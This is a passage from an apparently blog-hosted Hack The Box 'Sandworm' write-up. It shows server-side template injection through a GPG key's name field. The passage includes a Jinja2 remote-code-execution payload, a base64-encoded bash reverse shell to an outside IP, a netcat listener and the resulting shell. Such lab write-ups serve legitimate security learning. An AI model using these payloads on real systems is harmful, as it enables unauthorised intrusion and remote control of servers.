<span class="n">ugFG5GQTItCu0jLmPB71AAO1g9CHgcQiRmCpyPvcJajUM7JqlQegcKgZlWSr08aU</span>
<span class="n">cgvbsiSqZQmub1</span><span class="o">/</span><span class="mi">1</span><span class="n">loEsXgQc2C27</span><span class="o">+</span><span class="n">oPfzp1</span><span class="o">+</span><span class="n">v3CJYJ3JPSHCrBeIjHNXPyH6fQAR</span>
<span class="n">AQABiQG8BBgBCgAmFiEEoPY4HuyVPyH</span><span class="o">/</span><span class="n">BODA730zdsfxfbcFAmVZBLwCGwwFCQPC</span>
<span class="n">ZwAACgkQ730zdsfxfbeV4wv</span><span class="o">+</span><span class="n">JbUZW129O</span><span class="o">/</span><span class="mi">5</span><span class="n">J0uZIUqqidKvh</span><span class="o">+</span><span class="n">GZQPLp8zsM2iE</span><span class="o">/</span><span class="mi">4</span>
<span class="n">QhngcnGRKLvgZlsGsN04K0XNkpVJjk0xPnicK</span><span class="o">+</span><span class="n">c9rD0eXaJcNuTLtjXNEzavu</span><span class="o">+</span><span class="n">qW</span>
<span class="n">j335FBjjpbwqoGCrFyKwegrArtB07cUGoycC8YEU4dJtzf70pdHRSXJDeVvCnTmu</span>
<span class="n">rYooaqDqjCB0gdGSEKfHdsYSZAxJ</span><span class="o">+</span><span class="n">MuTywGF9qxb4dzncizjT97IaKgNB</span><span class="o">+</span><span class="n">i7StsC</span>
<span class="n">M4CuYZL0DY9wlMPVhQTMT3z0nGuIebMxcZ3YuyOXfXf3uiR0m0MUl9p</span><span class="o">+</span><span class="n">VS</span><span class="o">/</span><span class="n">v3gw8</span>
<span class="n">ddFuVGr6OGeLviwzKULhxq</span><span class="o">/</span><span class="n">UgUIS7jQK6BMx2xbxcEXFG5qad7s4NPlqdvX7qAAB</span>
<span class="n">ibMp4CYYHn</span><span class="o">+</span><span class="n">ncxi2b</span><span class="o">/</span><span class="n">LfEOpuDWoO</span><span class="o">+</span><span class="n">kfiucSzNsjBRmQP1BT3v0yT3dRgNxYx7s4R</span>
<span class="n">t6P</span><span class="o">+</span><span class="n">CB2ynZc0JyqtBrmTH</span><span class="o">/</span><span class="n">FZWlkdKjBbuyPpCE16OopIspzLlE</span><span class="o">+</span><span class="mi">73</span><span class="n">esDTK2gd</span><span class="o">+</span><span class="n">i8</span>
<span class="mi">3</span><span class="n">veJXTAW4UqfoAIklzEyrWYf</span>
<span class="o">=</span><span class="n">CagM</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">PGP</span> <span class="n">PUBLIC</span> <span class="n">KEY</span> <span class="n">BLOCK</span><span class="o">-----</span>
</pre></div>

Let's populate the fields with the respective information.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/20.png"/><br/><br/>
Upon clicking on <code>Verify Signature</code>, the application displays the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/21.png"/><br/><br/>
It's evident that the <code>Email</code> and the <code>Real Name</code> specified during key generation are reflected in this message. Let's attempt the Server-Side Template Injection (SSTI) once again.<br/><br/>
I will create new keys, specifying <code>{{7*7}}</code> as the Real Name and <code>elswix1@elswix.com</code> as the Email:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
<span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
<span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
<span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>

<span class="n">Note</span><span class="p">:</span> <span class="n">Use</span> <span class="s2">"gpg --full-generate-key"</span> <span class="k">for</span> <span class="n">a</span> <span class="n">full</span> <span class="n">featured</span> <span class="n">key</span> <span class="n">generation</span> <span class="n">dialog</span><span class="o">.</span>

<span class="n">GnuPG</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">construct</span> <span class="n">a</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">your</span> <span class="n">key</span><span class="o">.</span>

<span class="n">Real</span> <span class="n">name</span><span class="p">:</span> <span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>
<span class="n">Email</span> <span class="n">address</span><span class="p">:</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span>
<span class="n">You</span> <span class="n">selected</span> <span class="n">this</span> <span class="n">USER</span><span class="o">-</span><span class="n">ID</span><span class="p">:</span>
    <span class="s2">"{{7*7}} &lt;elswix1@elswix.com&gt;"</span>

<span class="n">Change</span> <span class="p">(</span><span class="n">N</span><span class="p">)</span><span class="n">ame</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span><span class="n">mail</span><span class="p">,</span> <span class="ow">or</span> <span class="p">(</span><span class="n">O</span><span class="p">)</span><span class="n">kay</span><span class="o">/</span><span class="p">(</span><span class="n">Q</span><span class="p">)</span><span class="n">uit</span><span class="err">?</span> <span class="n">O</span>
<span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">generate</span> <span class="n">a</span> <span class="n">lot</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span><span class="o">.</span> <span class="n">It</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">good</span> <span class="n">idea</span> <span class="n">to</span> <span class="n">perform</span>
<span class="n">some</span> <span class="n">other</span> <span class="n">action</span> <span class="p">(</span><span class="nb">type</span> <span class="n">on</span> <span class="n">the</span> <span class="n">keyboard</span><span class="p">,</span> <span class="n">move</span> <span class="n">the</span> <span class="n">mouse</span><span class="p">,</span> <span class="n">utilize</span> <span class="n">the</span>
<span class="n">disks</span><span class="p">)</span> <span class="n">during</span> <span class="n">the</span> <span class="n">prime</span> <span class="n">generation</span><span class="p">;</span> <span class="n">this</span> <span class="n">gives</span> <span class="n">the</span> <span class="n">random</span> <span class="n">number</span>
<span class="n">generator</span> <span class="n">a</span> <span class="n">better</span> <span class="n">chance</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">enough</span> <span class="n">entropy</span><span class="o">.</span>
<span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">generate</span> <span class="n">a</span> <span class="n">lot</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span><span class="o">.</span> <span class="n">It</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">good</span> <span class="n">idea</span> <span class="n">to</span> <span class="n">perform</span>
<span class="n">some</span> <span class="n">other</span> <span class="n">action</span> <span class="p">(</span><span class="nb">type</span> <span class="n">on</span> <span class="n">the</span> <span class="n">keyboard</span><span class="p">,</span> <span class="n">move</span> <span class="n">the</span> <span class="n">mouse</span><span class="p">,</span> <span class="n">utilize</span> <span class="n">the</span>
<span class="n">disks</span><span class="p">)</span> <span class="n">during</span> <span class="n">the</span> <span class="n">prime</span> <span class="n">generation</span><span class="p">;</span> <span class="n">this</span> <span class="n">gives</span> <span class="n">the</span> <span class="n">random</span> <span class="n">number</span>
<span class="n">generator</span> <span class="n">a</span> <span class="n">better</span> <span class="n">chance</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">enough</span> <span class="n">entropy</span><span class="o">.</span>
<span class="n">gpg</span><span class="p">:</span> <span class="n">revocation</span> <span class="n">certificate</span> <span class="n">stored</span> <span class="k">as</span> <span class="s1">'/home/elswix/.gnupg/openpgp-revocs.d/C22982C73DE901507E5A32B4F42AD5179C0A3B69.rev'</span>
<span class="n">public</span> <span class="ow">and</span> <span class="n">secret</span> <span class="n">key</span> <span class="n">created</span> <span class="ow">and</span> <span class="n">signed</span><span class="o">.</span>

<span class="n">pub</span>   <span class="n">rsa3072</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="p">[</span><span class="n">SC</span><span class="p">]</span> <span class="p">[</span><span class="n">expires</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
      <span class="n">C22982C73DE901507E5A32B4F42AD5179C0A3B69</span>
<span class="n">uid</span>                      <span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span> <span class="o">&lt;</span><span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
<span class="n">sub</span>   <span class="n">rsa3072</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="p">[</span><span class="n">E</span><span class="p">]</span> <span class="p">[</span><span class="n">expires</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
</pre></div>

Let's encrypt the same message once again:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
<span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
</pre></div>

Now, let's export the new Public Key:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
</pre></div>

Now let's fill in the fields:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/22.png"/><br/><br/>
Upon clicking <code>Verify Signature</code>, it becomes apparent that we have successfully exploited an SSTI:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/23.png"/><br/><br/>
The mathematical operation (<code>{{7*7}}</code>) was interpreted and returned 49.<br/><br/>
In <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">PayloadsAllTheThings</a>, there are payloads for achieving Remote Command Execution using <code>Jinja2</code>. I will use the following payload:<br/><br/>
<div class="highlight"><pre><span></span><span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></div>

Now, let's generate new keys, specifying this payload as the Real Name and a different email:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
<span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
<span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
<span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>

<span class="n">Note</span><span class="p">:</span> <span class="n">Use</span> <span class="s2">"gpg --full-generate-key"</span> <span class="k">for</span> <span class="n">a</span> <span class="n">full</span> <span class="n">featured</span> <span class="n">key</span> <span class="n">generation</span> <span class="n">dialog</span><span class="o">.</span>

<span class="n">GnuPG</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">construct</span> <span class="n">a</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">your</span> <span class="n">key</span><span class="o">.</span>

<span class="n">Real</span> <span class="n">name</span><span class="p">:</span> <span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="n">Email</span> <span class="n">address</span><span class="p">:</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span>
<span class="n">You</span> <span class="n">selected</span> <span class="n">this</span> <span class="n">USER</span><span class="o">-</span><span class="n">ID</span><span class="p">:</span>
    <span class="s2">"{{ cycler.__init__.__globals__.os.popen('id').read() }} &lt;elswix2@elswix.com&gt;"</span>

<span class="n">Change</span> <span class="p">(</span><span class="n">N</span><span class="p">)</span><span class="n">ame</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span><span class="n">mail</span><span class="p">,</span> <span class="ow">or</span> <span class="p">(</span><span class="n">O</span><span class="p">)</span><span class="n">kay</span><span class="o">/</span><span class="p">(</span><span class="n">Q</span><span class="p">)</span><span class="n">uit</span><span class="err">?</span> <span class="n">O</span>
<span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">generate</span> <span class="n">a</span> <span class="n">lot</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span><span class="o">.</span> <span class="n">It</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">good</span> <span class="n">idea</span> <span class="n">to</span> <span class="n">perform</span>
<span class="n">some</span> <span class="n">other</span> <span class="n">action</span> <span class="p">(</span><span class="nb">type</span> <span class="n">on</span> <span class="n">the</span> <span class="n">keyboard</span><span class="p">,</span> <span class="n">move</span> <span class="n">the</span> <span class="n">mouse</span><span class="p">,</span> <span class="n">utilize</span> <span class="n">the</span>
<span class="n">disks</span><span class="p">)</span> <span class="n">during</span> <span class="n">the</span> <span class="n">prime</span> <span class="n">generation</span><span class="p">;</span> <span class="n">this</span> <span class="n">gives</span> <span class="n">the</span> <span class="n">random</span> <span class="n">number</span>
<span class="n">generator</span> <span class="n">a</span> <span class="n">better</span> <span class="n">chance</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">enough</span> <span class="n">entropy</span><span class="o">.</span>
<span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">generate</span> <span class="n">a</span> <span class="n">lot</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span><span class="o">.</span> <span class="n">It</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">good</span> <span class="n">idea</span> <span class="n">to</span> <span class="n">perform</span>
<span class="n">some</span> <span class="n">other</span> <span class="n">action</span> <span class="p">(</span><span class="nb">type</span> <span class="n">on</span> <span class="n">the</span> <span class="n">keyboard</span><span class="p">,</span> <span class="n">move</span> <span class="n">the</span> <span class="n">mouse</span><span class="p">,</span> <span class="n">utilize</span> <span class="n">the</span>
<span class="n">disks</span><span class="p">)</span> <span class="n">during</span> <span class="n">the</span> <span class="n">prime</span> <span class="n">generation</span><span class="p">;</span> <span class="n">this</span> <span class="n">gives</span> <span class="n">the</span> <span class="n">random</span> <span class="n">number</span>
<span class="n">generator</span> <span class="n">a</span> <span class="n">better</span> <span class="n">chance</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">enough</span> <span class="n">entropy</span><span class="o">.</span>
<span class="n">gpg</span><span class="p">:</span> <span class="n">revocation</span> <span class="n">certificate</span> <span class="n">stored</span> <span class="k">as</span> <span class="s1">'/home/elswix/.gnupg/openpgp-revocs.d/3E46F2DF7BD37FF4F8E4A250A43894FC44028538.rev'</span>
<span class="n">public</span> <span class="ow">and</span> <span class="n">secret</span> <span class="n">key</span> <span class="n">created</span> <span class="ow">and</span> <span class="n">signed</span><span class="o">.</span>

<span class="n">pub</span>   <span class="n">rsa3072</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="p">[</span><span class="n">SC</span><span class="p">]</span> <span class="p">[</span><span class="n">expires</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
      <span class="mf">3E46</span><span class="n">F2DF7BD37FF4F8E4A250A43894FC44028538</span>
<span class="n">uid</span>                      <span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span> <span class="o">&lt;</span><span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
<span class="n">sub</span>   <span class="n">rsa3072</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="p">[</span><span class="n">E</span><span class="p">]</span> <span class="p">[</span><span class="n">expires</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
</pre></div>

Then, let's sign the same message again:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
<span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
</pre></div>

Don't forget to export the new public key:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/24.png"/><br/><br/>
Upon clicking on <code>Verify Signature</code>, the page displays the following content:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/25.png"/><br/><br/>
We're now executing system-level commands on the victim machine by exploiting the SSTI vulnerability.<br/><br/>
Executing commands in this manner can be cumbersome, so let's send a reverse shell. Given that the standard bash reverse shell contains numerous special characters, I will encode the payload in base64:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.7/3001 0&gt;&amp;1'</span> <span class="o">|</span> <span class="n">base64</span>
<span class="n">YmFzaCAtaSA</span><span class="o">+</span><span class="n">JiAvZGV2L3RjcC8xMC4xMC4xNi43LzMwMDEgMD4mMQo</span><span class="o">=</span>
</pre></div>

The SSTI payload will be as follows:<br/><br/>
<div class="highlight"><pre><span></span><span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzMwMDEgMD4mMQo= | base64 -d | bash'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></div>

Once again, let's generate new keys:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
<span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
<span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
<span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>

<span class="n">Note</span><span class="p">:</span> <span class="n">Use</span> <span class="s2">"gpg --full-generate-key"</span> <span class="k">for</span> <span class="n">a</span> <span class="n">full</span> <span class="n">featured</span> <span class="n">key</span> <span class="n">generation</span> <span class="n">dialog</span><span class="o">.</span>

<span class="n">GnuPG</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">construct</span> <span class="n">a</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">your</span> <span class="n">key</span><span class="o">.</span>

<span class="n">Real</span> <span class="n">name</span><span class="p">:</span>
</pre></div>

The Real Name will be as follows:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">Real</span> <span class="n">name</span><span class="p">:</span> <span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzMwMDEgMD4mMQo= | base64 -d | bash'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="n">Email</span> <span class="n">address</span><span class="p">:</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span>
</pre></div>

After generating the keys, let's sign the message:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
<span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
</pre></div>

Next, let's export the public key:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
</pre></div>

Before sending the information, let's set up our netcat (nc) listener on port 3001:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
</pre></div>

Now, with the information entered, let's click on <code>Verify Signature</code><br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/26.png"/><br/><br/>
Finally, we have obtained the reverse shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mf">48978.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">lesspipe</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">dirname</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">SSA</span><span class="err">$</span>
</pre></div>

We have successfully obtained a shell as the user "atlas."<br/><br/>
It appears to be a restricted shell, as certain commands like <code>whoami</code> do not seem to be available:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">Could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">command</span><span class="o">-</span><span class="ow">not</span><span class="o">-</span><span class="n">found</span> <span class="n">database</span><span class="o">.</span> <span class="n">Run</span> <span class="s1">'sudo apt update'</span> <span class="n">to</span> <span class="n">populate</span> <span class="n">it</span><span class="o">.</span>
<span class="n">whoami</span><span class="p">:</span> <span class="n">command</span> <span class="ow">not</span> <span class="n">found</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

We find ourselves in a constrained shell, and unfortunately, the <code>script</code> command is not available. Therefore, we need to explore alternative methods to upgrade our shell.<br/><br/>
Fortunately, Python3 is available, and we can leverage the <code>pty</code> module to upgrade our shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">lesspipe</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">dirname</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Now, press <code>Ctrl+Z</code> to background the current shell process, and then run the following commands:<br/><br/>
